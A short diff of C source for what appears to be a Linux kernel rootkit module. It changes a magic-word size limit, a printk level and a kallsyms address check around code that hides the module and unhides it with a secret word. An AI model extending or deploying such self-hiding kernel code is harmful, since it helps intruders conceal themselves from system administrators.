@@ -24,9 +24,10 @@
 
 #include "kernel_addr.h"
 #include "randbytes.h"
+#include "regs.h"
 
 #define MAX_PROCFS_SIZE 64
-#define MAX_MAGIC_WORD_SIZE MAX_PROCFS_SIZE
+#define MAX_MAGIC_WORD_SIZE 16
 #ifndef MODNAME
 #pragma message "Missing \'MODNAME\' compilation directive. See Makefile."
 #endif
@@ -311,8 +312,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             static unsigned int msg_lock = 0;
             if(!msg_lock) {
                 msg_lock = 1;
-                printk(KERN_WARNING
-                        "Your module \'unhide\' magic word is: '%s'\n", magic_word);
+                printk(KERN_INFO "Your module \'unhide\' magic word is: '%s'\n", magic_word);
             }
             op_lock = 1;
             ntsh_hide_mod();
@@ -357,7 +357,7 @@ static int __init ntsh_init(void) {
 #endif
 
     kall_load_addr(); /* load kallsyms addresses */
-    if(!k_attach_pid)
+    if(!k_attach_pid || !k_vfs_rmdir /* XXX: unused for now, let's see how this will play out */)
         goto addr_error;
 
     if(!get_unhide_magic_word())
